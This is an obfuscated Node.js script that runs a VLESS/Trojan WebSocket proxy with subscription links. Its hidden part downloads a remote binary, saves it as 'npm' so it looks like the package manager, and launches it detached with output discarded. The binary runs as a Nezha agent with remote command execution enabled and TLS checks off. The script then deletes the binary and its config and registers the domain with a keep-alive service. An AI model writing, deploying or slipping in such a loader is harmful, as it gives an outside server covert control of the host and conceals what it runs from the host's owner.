const _0x143189=_0x5f0a;function _0x581b(){const _0x289098=['\x20-p\x20','application/json','Hug','Answer','map','crypto','Server','utf-8','http','NEZHA_KEY','2083','/bin/bash','reduce','find','trojan://','update','stream','from','connect','126RJgVRU','finish','2087','PORT','1561744EPSZMC','https://amd64.ssss.nyc.mn/agent','206295wVLFQF','https://arm64.ssss.nyc.mn/v1','child_process','createWriteStream','npm\x20is\x20already\x20running,\x20skip\x20running...','url','npm','get','write','setsid\x20nohup\x20./npm\x20-s\x20','includes','path','https://arm64.ssss.nyc.mn/agent','8299200VvIbUP','--tls','&type=A','arm','6d07cc86-6d71-4730-9f26-24443767604b','npm\x20download\x20successfully','join','unlink','readUInt8','&fp=chrome&type=ws&host=','pipe','977102pVXveU','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','index.html','catch',':443?security=tls&sni=','connection','8.8.4.4','6454zqgHnz','sha224','client_secret:\x20','\x20with\x20all\x20DNS\x20servers','length','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','true','https://','npm\x20is\x20running','decode','https://oooo.serv00.net/add-url','2053','AUTO_ACCESS','SUB_PATH','WSPATH','readFile','hex','aarch64','Automatic\x20Access\x20Task\x20added\x20successfully','NEZHA_SERVER','Server\x20is\x20running\x20on\x20port\x20','NAME','substr','toString','slice','trim','then','error','writeHead','2096','data','digest','country','log','post','https://speed.cloudflare.com/meta','sub','axios','readUInt16BE','UUID','false','arch','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','createHash','chmod\x20+x\x20npm','1.1.1.1','base64','https://dns.google/resolve?name=','env','443','send','1101YuKnAO','close','8443','error:\x20','once','end','DOMAIN','5128218CEiwro',':443?encryption=none&security=tls&sni=','split','concat','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','352798ultawc','https://amd64.ssss.nyc.mn/v1','asOrganization','listen','text/html','&path=%2F'];_0x581b=function(){return _0x289098;};return _0x581b();}(function(_0x1e90af,_0x91fecc){const _0x3cc7f3=_0x5f0a,_0x2728ef=_0x1e90af();while(!![]){try{const _0x5d2bcd=parseInt(_0x3cc7f3(0x20e))/0x1+parseInt(_0x3cc7f3(0x1cf))/0x2*(-parseInt(_0x3cc7f3(0x202))/0x3)+parseInt(_0x3cc7f3(0x1ae))/0x4+parseInt(_0x3cc7f3(0x1b0))/0x5*(parseInt(_0x3cc7f3(0x1aa))/0x6)+-parseInt(_0x3cc7f3(0x1c8))/0x7+parseInt(_0x3cc7f3(0x1bd))/0x8+-parseInt(_0x3cc7f3(0x209))/0x9;if(_0x5d2bcd===_0x91fecc)break;else _0x2728ef['push'](_0x2728ef['shift']());}catch(_0x4d7ca0){_0x2728ef['push'](_0x2728ef['shift']());}}}(_0x581b,0xb7ee0));const os=require('os'),http=require(_0x143189(0x21c)),fs=require('fs'),axios=require(_0x143189(0x1f4)),net=require('net'),path=require(_0x143189(0x1bb)),crypto=require(_0x143189(0x219)),{Buffer}=require('buffer'),{exec,execSync}=require(_0x143189(0x1b2)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x143189(0x1ff)][_0x143189(0x1f6)]||_0x143189(0x1c1),NEZHA_SERVER=process[_0x143189(0x1ff)][_0x143189(0x1e2)]||'',NEZHA_PORT=process[_0x143189(0x1ff)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x143189(0x1ff)][_0x143189(0x21d)]||'',DOMAIN=process[_0x143189(0x1ff)][_0x143189(0x208)]||'1234.abc.com',AUTO_ACCESS=process[_0x143189(0x1ff)][_0x143189(0x1db)]||!![],WSPATH=process['env'][_0x143189(0x1dd)]||UUID[_0x143189(0x1e7)](0x0,0x8),SUB_PATH=process['env'][_0x143189(0x1dc)]||_0x143189(0x1f3),NAME=process[_0x143189(0x1ff)][_0x143189(0x1e4)]||_0x143189(0x216),PORT=process[_0x143189(0x1ff)][_0x143189(0x1ad)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x33010e=_0x143189;try{const _0x26fc06=await axios[_0x33010e(0x1b7)](_0x33010e(0x1f2)),_0x1ec972=_0x26fc06[_0x33010e(0x1ed)];ISP=(_0x1ec972[_0x33010e(0x1ef)]+'-'+_0x1ec972[_0x33010e(0x210)])['replace'](/ /g,'_');}catch(_0x10fa70){ISP='Unknown';}};GetISP();const httpServer=http['createServer']((_0x2160d7,_0x52beb2)=>{const _0x551e7a=_0x143189;if(_0x2160d7[_0x551e7a(0x1b5)]==='/'){const _0x5032bb=path[_0x551e7a(0x1c3)](__dirname,_0x551e7a(0x1ca));fs[_0x551e7a(0x1de)](_0x5032bb,'utf8',(_0x4aa0c1,_0x495a46)=>{const _0x4cba83=_0x551e7a;if(_0x4aa0c1){_0x52beb2['writeHead'](0xc8,{'Content-Type':'text/html'}),_0x52beb2[_0x4cba83(0x207)]('Hello\x20world!');return;}_0x52beb2['writeHead'](0xc8,{'Content-Type':_0x4cba83(0x212)}),_0x52beb2[_0x4cba83(0x207)](_0x495a46);});return;}else{if(_0x2160d7[_0x551e7a(0x1b5)]==='/'+SUB_PATH){const _0x1f7511='vless://'+UUID+'@'+DOMAIN+_0x551e7a(0x20a)+DOMAIN+_0x551e7a(0x1c6)+DOMAIN+_0x551e7a(0x213)+WSPATH+'#'+NAME+'-'+ISP,_0x41845c=_0x551e7a(0x222)+UUID+'@'+DOMAIN+_0x551e7a(0x1cc)+DOMAIN+_0x551e7a(0x1c6)+DOMAIN+_0x551e7a(0x213)+WSPATH+'#'+NAME+'-'+ISP,_0x3f884f=_0x1f7511+'\x0a'+_0x41845c,_0x4adfcb=Buffer[_0x551e7a(0x1a8)](_0x3f884f)[_0x551e7a(0x1e6)](_0x551e7a(0x1fd));_0x52beb2['writeHead'](0xc8,{'Content-Type':'text/plain'}),_0x52beb2[_0x551e7a(0x207)](_0x4adfcb+'\x0a');}else _0x52beb2[_0x551e7a(0x1eb)](0x194,{'Content-Type':'text/plain'}),_0x52beb2[_0x551e7a(0x207)]('Not\x20Found\x0a');}}),wss=new WebSocket[(_0x143189(0x21a))]({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=[_0x143189(0x1ce),_0x143189(0x1fc)];function resolveHost(_0xed5be4){return new Promise((_0x3a7e4e,_0x80089c)=>{if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/['test'](_0xed5be4)){_0x3a7e4e(_0xed5be4);return;}let _0x111f1b=0x0;function _0x512761(){const _0x36b90d=_0x5f0a;if(_0x111f1b>=DNS_SERVERS[_0x36b90d(0x1d3)]){_0x80089c(new Error('Failed\x20to\x20resolve\x20'+_0xed5be4+_0x36b90d(0x1d2)));return;}const _0x3a6c62=DNS_SERVERS[_0x111f1b];_0x111f1b++;const _0x19653b=_0x36b90d(0x1fe)+encodeURIComponent(_0xed5be4)+_0x36b90d(0x1bf);axios['get'](_0x19653b,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x36b90d(0x1e9)](_0x477d90=>{const _0x1f4f3e=_0x36b90d,_0x529a5c=_0x477d90[_0x1f4f3e(0x1ed)];if(_0x529a5c['Status']===0x0&&_0x529a5c[_0x1f4f3e(0x217)]&&_0x529a5c[_0x1f4f3e(0x217)][_0x1f4f3e(0x1d3)]>0x0){const _0x4d01a5=_0x529a5c[_0x1f4f3e(0x217)][_0x1f4f3e(0x221)](_0x35c71e=>_0x35c71e['type']===0x1);if(_0x4d01a5){_0x3a7e4e(_0x4d01a5[_0x1f4f3e(0x1ed)]);return;}}_0x512761();})['catch'](_0x5a43fa=>{_0x512761();});}_0x512761();});}function handleVlessConnection(_0x32aa91,_0x2baa71){const _0x1f9821=_0x143189,[_0xfb928a]=_0x2baa71,_0x471c88=_0x2baa71[_0x1f9821(0x1e7)](0x1,0x11);if(!_0x471c88['every']((_0x261d30,_0x269e0b)=>_0x261d30==parseInt(uuid[_0x1f9821(0x1e5)](_0x269e0b*0x2,0x2),0x10)))return![];let _0x44f683=_0x2baa71['slice'](0x11,0x12)[_0x1f9821(0x1c5)]()+0x13;const _0xeb963=_0x2baa71[_0x1f9821(0x1e7)](_0x44f683,_0x44f683+=0x2)[_0x1f9821(0x1f5)](0x0),_0x34154c=_0x2baa71[_0x1f9821(0x1e7)](_0x44f683,_0x44f683+=0x1)[_0x1f9821(0x1c5)](),_0x18021e=_0x34154c==0x1?_0x2baa71['slice'](_0x44f683,_0x44f683+=0x4)[_0x1f9821(0x1c3)]('.'):_0x34154c==0x2?new TextDecoder()[_0x1f9821(0x1d8)](_0x2baa71[_0x1f9821(0x1e7)](_0x44f683+0x1,_0x44f683+=0x1+_0x2baa71['slice'](_0x44f683,_0x44f683+0x1)[_0x1f9821(0x1c5)]())):_0x34154c==0x3?_0x2baa71[_0x1f9821(0x1e7)](_0x44f683,_0x44f683+=0x10)[_0x1f9821(0x220)]((_0x425b02,_0xa623d,_0x20b84a,_0x48e95a)=>_0x20b84a%0x2?_0x425b02[_0x1f9821(0x20c)](_0x48e95a['slice'](_0x20b84a-0x1,_0x20b84a+0x1)):_0x425b02,[])[_0x1f9821(0x218)](_0x5256c4=>_0x5256c4[_0x1f9821(0x1f5)](0x0)[_0x1f9821(0x1e6)](0x10))[_0x1f9821(0x1c3)](':'):'';_0x32aa91[_0x1f9821(0x201)](new Uint8Array([_0xfb928a,0x0]));const _0x37ea65=createWebSocketStream(_0x32aa91);return resolveHost(_0x18021e)[_0x1f9821(0x1e9)](_0x1a429d=>{const _0x4aa5e3=_0x1f9821;net[_0x4aa5e3(0x1a9)]({'host':_0x1a429d,'port':_0xeb963},function(){const _0x4258b7=_0x4aa5e3;this['write'](_0x2baa71[_0x4258b7(0x1e7)](_0x44f683)),_0x37ea65['on']('error',()=>{})[_0x4258b7(0x1c7)](this)['on'](_0x4258b7(0x1ea),()=>{})[_0x4258b7(0x1c7)](_0x37ea65);})['on'](_0x4aa5e3(0x1ea),()=>{});})[_0x1f9821(0x1cb)](_0x191024=>{const _0xdfb065=_0x1f9821;net[_0xdfb065(0x1a9)]({'host':_0x18021e,'port':_0xeb963},function(){const _0x52926a=_0xdfb065;this[_0x52926a(0x1b8)](_0x2baa71[_0x52926a(0x1e7)](_0x44f683)),_0x37ea65['on']('error',()=>{})[_0x52926a(0x1c7)](this)['on']('error',()=>{})[_0x52926a(0x1c7)](_0x37ea65);})['on'](_0xdfb065(0x1ea),()=>{});}),!![];}function _0x5f0a(_0x130468,_0x539ea5){const _0x581bac=_0x581b();return _0x5f0a=function(_0x5f0a4c,_0x57d290){_0x5f0a4c=_0x5f0a4c-0x1a8;let _0xd3c176=_0x581bac[_0x5f0a4c];return _0xd3c176;},_0x5f0a(_0x130468,_0x539ea5);}function handleTrojanConnection(_0x44ed15,_0x1c3365){const _0xf3aed=_0x143189;try{if(_0x1c3365['length']<0x3a)return![];const _0x1287c7=_0x1c3365[_0xf3aed(0x1e7)](0x0,0x38)[_0xf3aed(0x1e6)](),_0x468888=[UUID];let _0x17a12c=null;for(const _0x4c0ebe of _0x468888){const _0x3e3222=crypto[_0xf3aed(0x1fa)](_0xf3aed(0x1d0))[_0xf3aed(0x223)](_0x4c0ebe)[_0xf3aed(0x1ee)](_0xf3aed(0x1df));if(_0x3e3222===_0x1287c7){_0x17a12c=_0x4c0ebe;break;}}if(!_0x17a12c)return![];let _0xb76241=0x38;_0x1c3365[_0xb76241]===0xd&&_0x1c3365[_0xb76241+0x1]===0xa&&(_0xb76241+=0x2);const _0x9e31e2=_0x1c3365[_0xb76241];if(_0x9e31e2!==0x1)return![];_0xb76241+=0x1;const _0x3724f5=_0x1c3365[_0xb76241];_0xb76241+=0x1;let _0x1c4914,_0x5a1a02;if(_0x3724f5===0x1)_0x1c4914=_0x1c3365[_0xf3aed(0x1e7)](_0xb76241,_0xb76241+0x4)[_0xf3aed(0x1c3)]('.'),_0xb76241+=0x4;else{if(_0x3724f5===0x3){const _0x275d75=_0x1c3365[_0xb76241];_0xb76241+=0x1,_0x1c4914=_0x1c3365[_0xf3aed(0x1e7)](_0xb76241,_0xb76241+_0x275d75)[_0xf3aed(0x1e6)](),_0xb76241+=_0x275d75;}else{if(_0x3724f5===0x4)_0x1c4914=_0x1c3365['slice'](_0xb76241,_0xb76241+0x10)[_0xf3aed(0x220)]((_0x7caf99,_0x4fea3e,_0x54688a,_0x4633e9)=>_0x54688a%0x2?_0x7caf99['concat'](_0x4633e9['slice'](_0x54688a-0x1,_0x54688a+0x1)):_0x7caf99,[])[_0xf3aed(0x218)](_0x35579a=>_0x35579a['readUInt16BE'](0x0)[_0xf3aed(0x1e6)](0x10))[_0xf3aed(0x1c3)](':'),_0xb76241+=0x10;else return![];}}_0x5a1a02=_0x1c3365[_0xf3aed(0x1f5)](_0xb76241),_0xb76241+=0x2;_0xb76241<_0x1c3365[_0xf3aed(0x1d3)]&&_0x1c3365[_0xb76241]===0xd&&_0x1c3365[_0xb76241+0x1]===0xa&&(_0xb76241+=0x2);const _0x29ed34=createWebSocketStream(_0x44ed15);return resolveHost(_0x1c4914)[_0xf3aed(0x1e9)](_0x1ce283=>{net['connect']({'host':_0x1ce283,'port':_0x5a1a02},function(){const _0x373e62=_0x5f0a;_0xb76241<_0x1c3365[_0x373e62(0x1d3)]&&this[_0x373e62(0x1b8)](_0x1c3365[_0x373e62(0x1e7)](_0xb76241)),_0x29ed34['on'](_0x373e62(0x1ea),()=>{})[_0x373e62(0x1c7)](this)['on'](_0x373e62(0x1ea),()=>{})[_0x373e62(0x1c7)](_0x29ed34);})['on']('error',()=>{});})[_0xf3aed(0x1cb)](_0x28b0b2=>{const _0x1eb26d=_0xf3aed;net[_0x1eb26d(0x1a9)]({'host':_0x1c4914,'port':_0x5a1a02},function(){const _0x2b12b9=_0x1eb26d;_0xb76241<_0x1c3365[_0x2b12b9(0x1d3)]&&this['write'](_0x1c3365[_0x2b12b9(0x1e7)](_0xb76241)),_0x29ed34['on'](_0x2b12b9(0x1ea),()=>{})['pipe'](this)['on'](_0x2b12b9(0x1ea),()=>{})['pipe'](_0x29ed34);})['on']('error',()=>{});}),!![];}catch(_0x29c637){return![];}}wss['on'](_0x143189(0x1cd),(_0x2590d7,_0xf49b4d)=>{const _0x4774cc=_0x143189,_0x28d4a8=_0xf49b4d['url']||'';_0x2590d7[_0x4774cc(0x206)]('message',_0x50520f=>{const _0xbaa1c6=_0x4774cc;if(_0x50520f[_0xbaa1c6(0x1d3)]>0x11&&_0x50520f[0x0]===0x0){const _0x1d9861=_0x50520f[_0xbaa1c6(0x1e7)](0x1,0x11),_0x31985d=_0x1d9861['every']((_0x16845d,_0x25b070)=>_0x16845d==parseInt(uuid[_0xbaa1c6(0x1e5)](_0x25b070*0x2,0x2),0x10));if(_0x31985d){!handleVlessConnection(_0x2590d7,_0x50520f)&&_0x2590d7['close']();return;}}!handleTrojanConnection(_0x2590d7,_0x50520f)&&_0x2590d7[_0xbaa1c6(0x203)]();})['on'](_0x4774cc(0x1ea),()=>{});});const getDownloadUrl=()=>{const _0x1af5fa=_0x143189,_0x39bbcb=os[_0x1af5fa(0x1f8)]();return _0x39bbcb===_0x1af5fa(0x1c0)||_0x39bbcb==='arm64'||_0x39bbcb===_0x1af5fa(0x1e0)?!NEZHA_PORT?_0x1af5fa(0x1b1):_0x1af5fa(0x1bc):!NEZHA_PORT?_0x1af5fa(0x20f):_0x1af5fa(0x1af);},downloadFile=async()=>{const _0x223e51=_0x143189;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0xb5bf7d=getDownloadUrl(),_0x2c1180=await axios({'method':_0x223e51(0x1b7),'url':_0xb5bf7d,'responseType':_0x223e51(0x224)}),_0x4c67ce=fs[_0x223e51(0x1b3)](_0x223e51(0x1b6));return _0x2c1180[_0x223e51(0x1ed)]['pipe'](_0x4c67ce),new Promise((_0x1ee28b,_0x268c73)=>{const _0x24bdb0=_0x223e51;_0x4c67ce['on'](_0x24bdb0(0x1ab),()=>{const _0x557b7a=_0x24bdb0;console['log'](_0x557b7a(0x1c2)),exec(_0x557b7a(0x1fb),_0xb30a9d=>{if(_0xb30a9d)_0x268c73(_0xb30a9d);_0x1ee28b();});}),_0x4c67ce['on'](_0x24bdb0(0x1ea),_0x268c73);});}catch(_0x719a0d){throw _0x719a0d;}},runnz=async()=>{const _0x2bff78=_0x143189;try{const _0x7ff4c0=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x2bff78(0x21b)});if(_0x7ff4c0[_0x2bff78(0x1e8)]()!==''){console[_0x2bff78(0x1f0)](_0x2bff78(0x1b4));return;}}catch(_0x3c95a1){}await downloadFile();let _0x31b6dc='',_0x39916e=[_0x2bff78(0x200),_0x2bff78(0x204),_0x2bff78(0x1ec),_0x2bff78(0x1ac),_0x2bff78(0x21e),_0x2bff78(0x1da)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x3e9467=_0x39916e[_0x2bff78(0x1ba)](NEZHA_PORT)?_0x2bff78(0x1be):'';_0x31b6dc=_0x2bff78(0x1b9)+NEZHA_SERVER+':'+NEZHA_PORT+_0x2bff78(0x214)+NEZHA_KEY+'\x20'+_0x3e9467+_0x2bff78(0x20d);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1d83ca=NEZHA_SERVER[_0x2bff78(0x1ba)](':')?NEZHA_SERVER[_0x2bff78(0x20b)](':')['pop']():'',_0x35a5e7=_0x39916e[_0x2bff78(0x1ba)](_0x1d83ca)?_0x2bff78(0x1d5):_0x2bff78(0x1f7),_0x5a38d5=_0x2bff78(0x1d1)+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x35a5e7+_0x2bff78(0x1f9)+UUID;fs['writeFileSync']('config.yaml',_0x5a38d5);}_0x31b6dc=_0x2bff78(0x1c9);}else{console[_0x2bff78(0x1f0)](_0x2bff78(0x1d4));return;}}try{exec(_0x31b6dc,{'shell':_0x2bff78(0x21f)},_0xca8a9e=>{const _0x1608da=_0x2bff78;if(_0xca8a9e)console[_0x1608da(0x1ea)]('npm\x20running\x20error:',_0xca8a9e);else console[_0x1608da(0x1f0)](_0x1608da(0x1d7));});}catch(_0x2b430d){console['error'](_0x2bff78(0x205)+_0x2b430d);}};async function addAccessTask(){const _0x48f074=_0x143189;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x55a6e8=_0x48f074(0x1d6)+DOMAIN;try{const _0x5907b4=await axios[_0x48f074(0x1f1)](_0x48f074(0x1d9),{'url':_0x55a6e8},{'headers':{'Content-Type':_0x48f074(0x215)}});console[_0x48f074(0x1f0)](_0x48f074(0x1e1));}catch(_0x295221){}}const delFiles=()=>{const _0xc52cff=_0x143189;fs[_0xc52cff(0x1c4)](_0xc52cff(0x1b6),()=>{}),fs[_0xc52cff(0x1c4)]('config.yaml',()=>{});};httpServer[_0x143189(0x211)](PORT,()=>{const _0x480cba=_0x143189;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x480cba(0x1f0)](_0x480cba(0x1e3)+PORT);});
